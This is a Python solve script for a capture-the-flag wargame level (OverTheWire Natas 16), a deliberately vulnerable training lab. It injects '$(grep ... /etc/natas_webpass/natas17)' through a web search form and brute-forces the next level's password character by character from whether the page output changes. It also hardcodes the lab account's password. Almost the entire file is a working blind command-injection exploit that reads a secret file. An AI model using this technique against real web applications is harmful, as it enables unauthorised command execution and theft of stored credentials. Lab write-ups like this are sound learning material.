#!/bin/python3

import string
import requests 
import re 
import html.parser

username = 'natas16'
oldpassword = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://%s.natas.labs.overthewire.org' % (username)
session = requests.Session()

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

password = ""
temppass = ""
for i in range(0,len(oldpassword)):
    
    for j in range(0,len(charset)):

        temppass =  "^" +  password + charset[j] 
        print ("current attempt = " + temppass)

        query = 'contesting$(grep ' + temppass + ' /etc/natas_webpass/natas17)'
        #print(query)
        data = { "needle" : query,  "submit" : "Search"} 
        response = session.post(url, data =data, auth = (username,oldpassword) )

        content = html.unescape(response.text)
        #print (content)
        if not (re.search("contesting",content)):
            password = password + charset[j] 
            print ("password so far = " + password)
            print ("Password length = {}".format(i+1))
            break
        else:
            continue
 
print ("password = " + password)

#for each character in the password
#iterate through each possible character 
#check with grep to see if the password so far is in the password file
#if it is then the results will be appended to "contesting" 
#and therefore there will be no result in the html
#this means that the password so far is the start of the password 
#so move onto the next char
#if no keep going 
#until all the chars have been found

#looking at older passwords i can see that they can use
#all alpha-numerics including capitals
#this might take a while
